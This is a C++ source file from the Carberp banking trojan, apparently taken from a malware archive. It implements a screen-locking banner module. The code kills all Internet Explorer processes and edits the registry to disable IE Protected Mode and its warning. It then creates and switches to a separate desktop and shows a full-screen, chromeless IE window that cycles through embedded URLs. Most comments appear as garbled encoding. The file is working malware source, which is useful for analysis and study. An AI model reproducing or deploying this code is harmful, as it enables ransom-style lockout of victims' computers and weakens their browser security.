/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>
#include <shlwapi.h>
#include <msHtml.h>
#include <shlobj.h>
#include <exdisp.h>

#include "dprint.h"
#include "banner.h"
#include "procenum.h"
#include "main.h"


// ��������� ���������: 
// ... warning C4192: automatically excluding '...' while importing type library 'shdocvw.dll'
#pragma warning(disable : 4192)
#import <shdocvw.dll> rename("FindText", "shdocvw_FindText")
#pragma warning(default : 4192)

#ifdef _DBG
#pragma message( "COMPILER MESSAGE: _DBG flag defined!" )
#else
#pragma message( "COMPILER MESSAGE: _DBG flag NOT defined!" )
#endif


/// ���� � ����� ���� ��������� �� ���������� COMPLETE
void WaitTillLoaded(SHDocVw::IWebBrowser2Ptr spBrowser)
{
    READYSTATE result;
    do
    {
        result=spBrowser->GetReadyState();

        if (result != READYSTATE_COMPLETE)
            Sleep (250);
    }
    while (result != READYSTATE_COMPLETE);

    return;
}

void WaitTillLoaded(IWebBrowser2 *spBrowser)
{
    READYSTATE result;
    do
    {
        spBrowser->get_ReadyState(&result);

        if (result != READYSTATE_COMPLETE)
            Sleep (250);
    }
    while (result != READYSTATE_COMPLETE);

    return;
}


/// ������� ANSI ����� � UNICODE.
PWSTR AnsiToUnicode(char *lpAnsiStr)
{
    int dwLen=MultiByteToWideChar(CP_ACP,NULL,lpAnsiStr,-1,NULL,NULL);
    PWSTR lpWStr=(PWSTR)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwLen*sizeof(WCHAR));
    MultiByteToWideChar(CP_ACP,NULL,lpAnsiStr,-1,lpWStr,dwLen);
    return lpWStr;
}

/// ����������� �� ������ URL��
/// fixed: �� �������� ������ ����� ������, ������� ������ ���� ����������.
WCHAR *pUrl;
WCHAR *GetNextUrl()
{
    if (!*pUrl)
        return NULL;

    WCHAR *lpUrl=pUrl;
    while ((*pUrl) && (*pUrl != L' '))
        pUrl++;

    if ((*pUrl) == L' ')
    {
      *pUrl = L'\0';
      pUrl++;
    }

    return lpUrl;
}


/// ���� �� �������� ���������� ������:
///   <body oncontextmenu=\"return false;\">
///
/// ���� ������� - ���� � ������ TRUE.

bool CheckPage(IWebBrowser2 *spBrowser)
{
    bool bRet=false;
    HRESULT hr;
    IDispatch *doc_disp=0;
    IDispatch *el_disp=0;
    IDispatch *tags_disp=0;
    IHTMLDocument2 *html_doc2=0;
    IHTMLElementCollection *all=0;
    IHTMLElementCollection *tags=0;
    IHTMLElement *el=0;

    try
    {
        // ��� ���� ������ � CRT, ������� ������������ ����� ��������
        // C++ exception.
        // ��� ������� �������� ������� ��� ���� � �������� ����.

        _variant_t v_tag_name("html");
        _variant_t v_id(0L);
        _variant_t v_empty;
        do
        {
            hr = spBrowser->get_Document(&doc_disp);
            if (FAILED(hr))
                break;

            hr = doc_disp->QueryInterface(IID_IHTMLDocument2,(void**)&html_doc2);
            if (FAILED(hr))
                break;

            hr = html_doc2->get_all(&all);
            if (FAILED(hr))
                break;

            hr = all->tags(v_tag_name,&el_disp);
            if (FAILED(hr))
                break;

            hr = el_disp->QueryInterface(IID_IHTMLElementCollection,(void**)&tags);
            if (FAILED(hr))
                break;

            hr = tags->item(v_id, v_empty, &tags_disp);
            if (FAILED(hr))
                break;

            hr = tags_disp->QueryInterface(IID_IHTMLElement, (void**)&el);
            if (FAILED(hr))
                break;

            BSTR text=0;
            hr = el->get_outerHTML(&text);
            if (FAILED(hr))
                break;

            if (NULL == StrStrI(text,L"<body oncontextmenu=\"return false;\">"))
                break;

            // All OK.
            bRet=true;
        }
        while (false);
    }
    catch(...)
    {
    }

    if (el)
        el->Release();

    if (tags_disp)
        tags_disp->Release();

    if (tags)
        tags->Release();

    if (el_disp)
        el_disp->Release();

    if (all)
        all->Release();

    if (html_doc2)
        html_doc2->Release();

    if (doc_disp)
        doc_disp->Release();
    return bRet;
}


/// ������� ��������� �������� ������.
/// ��������� � �������������� ������� ������.
/// ������� ��������� IE, ������ ������ ����� �
/// ���������� � ������ �����
/// ����� �� ������� ��������� URL �� ��������.
/// ����� �������� ��������� ������� ��������� ��������
/// � ����������� ��������.

extern "C" void* MemAlloc(size_t dwSize)
{
  return HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwSize);
}

extern "C" void MemFree(void *lpMem)
{
  if (lpMem == NULL) return;

  if (HeapValidate(GetProcessHeap(),0,lpMem))
    HeapFree(GetProcessHeap(),0,lpMem);
}

struct WorkingThreadParam {
  HDESK       hNewDesktop;
  HINSTANCE   hInstance;
};

// �������� ��� Winlogon, ������� �� ���� ������ ����������� 
// Ctrl+Alt+Del ������ ��� ������ ������ �������� ����� ������.

HANDLE CreateStartedEvent()
{
  SECURITY_ATTRIBUTES sa;
  SECURITY_DESCRIPTOR sd;

  InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
  SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
  
  sa.nLength = sizeof (SECURITY_ATTRIBUTES);
  sa.lpSecurityDescriptor = &sd;
  sa.bInheritHandle = FALSE;

  return ::CreateEvent(&sa, TRUE, FALSE, L"Global\\CC64BD66BCA1444C86FC0D8019E381E9");
}

// ��� ������� ������ ������ ���������� ������ 
// ������� ������.���� �� ��� ������ - ������ 
// ��� �������� ����� ��� ��������� � ��������.
HANDLE CreateBannerInstanceMutex()
{
  SECURITY_ATTRIBUTES sa;
  SECURITY_DESCRIPTOR sd;

  InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
  SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
  
  sa.nLength = sizeof (SECURITY_ATTRIBUTES);
  sa.lpSecurityDescriptor = &sd;
  sa.bInheritHandle = FALSE;

  return ::CreateMutex(&sa, FALSE, L"Global\\DCCFF93F3ACC4B2F8B4957A6A47D7DFE");
}

bool BannerStartInstance()
{
  HANDLE instance_mutex = CreateBannerInstanceMutex();
  DWORD last_error = GetLastError();
  
  PP_RETURNIF2(last_error == ERROR_SUCCESS, true);

  ::CloseHandle(instance_mutex);
  return false;
}

bool BannerStarted()
{
  HANDLE started_event = CreateStartedEvent();

  // ���� �� ���������� ������� - ������ �� �������.
  PP_RETURNIF2(started_event == NULL, false);

  DWORD wait_result = WaitForSingleObject(started_event, 100);
  ::CloseHandle(started_event);
  
  // ���� �� � ���������� ��������� - ������ �� �������.
  if (WAIT_OBJECT_0 != wait_result) return false; 

  return true;
}

void SetBannerStarted()
{
  HANDLE started_event = CreateStartedEvent();
  PP_RETURNIF1(started_event == NULL);

  PP_DPRINTF(L"SetBannerStarted: signaling 'BannerStarted' event.");
  ::SetEvent(started_event);
}


DWORD WINAPI BannerThread(LPVOID p)
{
  PP_DPRINTF(L"BannerThread: finished.");

  WorkingThreadParam* param = (WorkingThreadParam*)p;

  pUrl=(WCHAR*)MemAlloc(1024*1024*sizeof(WCHAR));
  ZeroMemory(pUrl, 1024*1024*sizeof(WCHAR));

  DWORD section_size = 0;
  void* section  = GetUrlsSection(&section_size);

  if (section_size != 0)
  {
    PP_DPRINTF(L"BannerThread: Resource loaded successfull. (ptr=%d size=%d)", 
      section, section_size);

    memcpy(pUrl,section,section_size);
  }

  PP_DPRINTF(L"BannerThread: Resource loading finished.");

  HDESK new_desktop = ::CreateDesktop(DESK_NAME,NULL,NULL,0,GENERIC_ALL,NULL);
  if (new_desktop)
  {
    BOOL thread_chandged = ::SetThreadDesktop(new_desktop);    
    PP_DPRINTF(L"BannerThread: SetThreadDesktop() to new desktop 0x%X result=%d",
      new_desktop,
      thread_chandged);

    BOOL switched = ::SwitchDesktop(new_desktop);
    PP_DPRINTF(L"BannerThread: New desktop switched. thread_changed=%d", switched);
  }

  CoInitialize(NULL);

  IWebBrowser2 *browser=NULL;

  if ((SUCCEEDED(CoCreateInstance(CLSID_InternetExplorer, NULL,CLSCTX_LOCAL_SERVER, IID_IWebBrowser2,(void**)&browser))) && (browser != NULL))
  {
    browser->put_Visible(VARIANT_TRUE);
    browser->put_Silent(VARIANT_TRUE);
    browser->put_MenuBar(VARIANT_FALSE);
    browser->put_StatusBar(VARIANT_FALSE);
    browser->put_Resizable(VARIANT_FALSE);
    browser->put_ToolBar(VARIANT_FALSE);
    browser->put_AddressBar(VARIANT_FALSE);
    browser->put_FullScreen(VARIANT_TRUE);

    // �� �� - �������� ���� � ���, ��� ������ ����� �������.
    SetBannerStarted();

    WCHAR *lpUrl;
    while (lpUrl=GetNextUrl())
    {
      VARIANT var;
      VariantInit(&var);
      BSTR bstrURL = SysAllocString(lpUrl);
      browser->Navigate(bstrURL, &var, &var, &var, &var);
      WaitTillLoaded(browser);
      if (CheckPage(browser))
          break;
    }
  }
  if (browser != NULL)
      browser->Release();

  CoUninitialize();
  MemFree(pUrl);
  MemFree(param);

  return 0;
}

void KillAllIeProcess()
{
  DWORD pids[200];
  DWORD pid_count = 0;

  FilteredEnumProcesses(ProcessFilter_IE, pids, ARRAYSIZE(pids), &pid_count);
  for (DWORD i = 0; i < pid_count; i++)
  {
    DWORD pid = pids[i];

    HANDLE hHandle=OpenProcess(PROCESS_TERMINATE, 0, pid);
    if (hHandle) 
    {
      ::TerminateProcess(hHandle,0);
      CloseHandle(hHandle);
    }
  }
  PP_DPRINTF(L"KillAllIeProcess: finished.");
}

void DisableIeProtectedMode()
{
  struct
  {
      TCHAR *lpName;
      DWORD dwValue;
  } ie_param_table[]=
  {
    {TEXT("2500"),3}
  };  

  /// ���������� ���������� Protected Mode � IE � ������ � ��� ����������.
  /// ��� ���� Security ��� IE �������� �������� 3 ��� ��������� "2500" �
  /// NoProtectedModeBanner�
  /// ������������:
  ///    http://support.microsoft.com/kb/182569
  ///    http://jjstellato.blogspot.com/2011/09/disable-protected-mode-and-protected.html
  HKEY hKey;
  for (int x=0; x < 2; x++)
  {
    HKEY hRootKey=(x) ? HKEY_CURRENT_USER : HKEY_LOCAL_MACHINE;
    for (int i=0; i <= 4; i++)
    {
      TCHAR szBuf[300];
      wsprintf(szBuf,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\%d"),i);
      if (!RegOpenKeyEx(hRootKey,szBuf,0,KEY_WOW64_64KEY+KEY_ALL_ACCESS,&hKey))
      {
        for (int j=0; j < ARRAYSIZE(ie_param_table); j++)
        {
          RegSetValueEx(hKey,ie_param_table[j].lpName,0,REG_DWORD,(BYTE*)&ie_param_table[j].dwValue,sizeof(DWORD));
        }
        RegCloseKey(hKey);
      }

      if (!RegOpenKeyEx(hRootKey,TEXT("Software\\Microsoft\\Internet Explorer\\Main"),0,KEY_WOW64_64KEY+KEY_ALL_ACCESS,&hKey))
      {
        DWORD dwEnabled=1;
        RegSetValueEx(hKey,TEXT("NoProtectedModeBanner"),0,REG_DWORD,(BYTE*)&dwEnabled,sizeof(dwEnabled));
        RegCloseKey(hKey);
      }
    }
  }
  PP_DPRINTF(L"DisableIeProtectedMode: finished setup registry for disabling IE Protected Mode.");
}


/*
������ StartIEShift ����� �����������:
- �� explorer - � ������ BootKit
- �� ������ ���������� - � ���� ������
  
� ����� ������ ���� �������� �� ������ � 
*/ 

void BannerStart(HINSTANCE module_handle)
{
  PP_DPRINTF(L"BannerStart: started.");

  PP_RETURNIF1(BannerStartInstance() == false);

  WorkingThreadParam* param = (WorkingThreadParam*)MemAlloc(sizeof(WorkingThreadParam));

  param->hInstance = module_handle;

  KillAllIeProcess();
  DisableIeProtectedMode();

  ::CreateThread(0,0, BannerThread, param,0,0);
}

void BannerSwitchToIeDesktop()
{
  HDESK desktop = ::OpenDesktop(DESK_NAME,NULL,FALSE,GENERIC_ALL);
  
  if (desktop)
  {
    ::SetThreadDesktop(desktop);
    ::SwitchDesktop(desktop);
  }
}

static bool IsCurrentProcessNotNotepad()
{
  return !IsCurrentProcessCorrespondToFilter(
    ProcessFilter_Notepad);
}

void TryInitBannerShowing()
{
  PP_DPRINTF(L"TryInitBannerShowing: started.");

  PP_RETURNIF1( IsCurrentProcessNotNotepad() );
  BannerStart(NULL);
}

void WINAPI Export_StartBanner(void* /*dll_body*/)
{
  BannerStart(NULL);
}
